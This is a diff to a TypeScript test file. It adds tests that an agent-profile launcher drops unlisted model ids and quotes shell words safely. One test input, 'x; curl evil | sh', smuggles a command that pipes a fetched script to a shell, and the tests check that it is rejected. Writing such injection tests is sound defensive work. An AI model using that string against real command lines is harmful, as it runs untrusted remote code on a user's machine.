@@ -8,6 +8,7 @@ import {
   loopModelArgs,
   profileMcpArgs,
   profileModelArgs,
+  shellWord,
   promptDeliveryFor,
 } from './index';
 
@@ -27,6 +28,20 @@ describe('profileModelArgs', () => {
   });
   it('resolves another CLI through its model list', () => {
     expect(profileModelArgs('agy', 'gemini-4-argon-low')).toEqual(['--model', 'gemini-4-argon-low']);
+  });
+  it('adds no flag for a model id the base CLI does not list — an imported file can carry anything', () => {
+    expect(profileModelArgs('codex', 'x; curl evil | sh')).toEqual([]);
+    expect(profileModelArgs('agy', 'not-a-model')).toEqual([]);
+    const line = buildProfileLaunchLine({ base: BUILTIN_AGENTS.find((a) => a.id === 'codex')!, model: 'x; curl evil | sh', promptPath: null, delivery: 'argument', mcpArgs: [], resume: false });
+    expect(line).not.toContain('curl');
+  });
+});
+
+describe('shellWord', () => {
+  it('leaves a safe word bare and quotes anything else exactly, whitespace included', () => {
+    expect(shellWord('--model')).toBe('--model');
+    expect(shellWord('a  b')).toBe("'a  b'");
+    expect(shellWord("it's")).toBe(String.raw`'it'\''s'`);
   });
 });
 
